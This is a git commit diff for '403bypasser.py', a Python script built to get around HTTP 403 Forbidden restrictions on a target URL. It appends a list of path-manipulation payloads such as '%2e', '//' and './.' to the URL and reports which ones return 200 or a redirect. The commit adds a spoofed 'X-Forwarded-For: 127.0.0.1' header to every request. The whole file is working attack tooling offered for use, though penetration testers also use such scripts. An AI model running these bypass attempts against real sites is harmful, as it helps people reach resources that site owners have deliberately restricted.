60cec30eae150c21ca63f75fbc4cfb9bb61cb136
Aydın Baran Ertemir <64380389+baranertemir@users.noreply.github.com>
2021-02-09 17:32:49 +0300

    Update 403bypasser.py

--- 403bypasser.py
+++ 403bypasser.py
@@ -18,16 +18,19 @@ def banner():
           """)
 banner()    
 bypass = ["%2e",".","?","??","//","./","/","*/","*","./.","././"]
+headers2 = {"X-Forwarded-For":"127.0.0.1"}
 
 parser = argparse.ArgumentParser(description="A.Baran Ertemir | 403 Forbidden Bypass Script")
 parser.add_argument("-u","--url",required=True,type=str,help="Please give me the URL to bypass.")
 args = parser.parse_args()
 
 for i in bypass:
-    r = requests.get(args.url+"/"+i)
+    r = requests.get(args.url+"/"+i,headers=headers2)
     if r.status_code == 200:
         print(r.status_code,"OK, IT'S ACCESIBLE [+]","|",args.url+"/"+i)
     elif r.status_code == 403:
         print(r.status_code,"OH, FORBIDDEN [-]","|",args.url+"/"+i)
+    elif r.status_code == 302:
+        print(r.status_code,"WOW, REDIRECTION [?]","|",args.url+"/"+i)
     else:
-        print("Not 200 or 403","Status Code:",r.status_code,"")
+        print("Not 200,302 or 403","Status Code:",r.status_code,"")
